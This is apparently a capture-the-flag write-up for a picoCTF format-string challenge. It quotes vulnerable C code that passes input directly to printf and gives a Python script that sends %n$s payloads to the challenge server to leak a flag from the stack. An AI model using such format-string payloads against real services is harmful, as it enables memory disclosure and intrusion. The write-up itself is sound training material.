# flag_leak challenge

## Flag
CTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}



from the analysis of the source and experience/knowledge while working on buffer_overflow_0,
```
printf("Tell me a story and then I'll tell you one >> ");
scanf("%127s", story);
printf("Here's a story - \n");
printf(story);
printf("\n");
```
no format specifier used in `printf(story)` 
using this exploit it is possible to dump the contents of the stack and ultimately the memory address of our flag stored as a local variable after the readflag(flag, FLAGSIZE) function is called

a brute force method was to view the contents of every index at stack, i tried doing it manually, was too much so I asked chatGPT to write a script 
created a flag.txt file and ran the script locally. It worked because `checksec vuln` mentioned PIE is disabled, so addresses for this program do not change. 

```
import socket

def find_flag():
    # Set up the connection to the remote server
    host = 'saturn.picoctf.net'
    port = 53359
    max_attempts = 500  # Adjust range as needed

    # Create a socket and connect to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        
        for n in range(1, max_attempts):
            payload = f"%{n}$s"  # The format string payload
            try:
                # Send the payload to the server
                s.sendall(payload.encode() + b'\n')

                # Receive the response from the server
                response = s.recv(1024).decode()  # Adjust buffer size if needed

                # Check if the output contains the flag
                if "picoCTF" in response:
                    print(f"Flag found: {response.strip()}")
                    break
            except Exception as e:
                print(f"Error on index {n}: {e}")
                continue
        else:
            print("Flag not found within the specified range.")

# Start the function to search for the flag
find_flag()

```

and found it at index 24! ran it in the webshell and got the flag. 
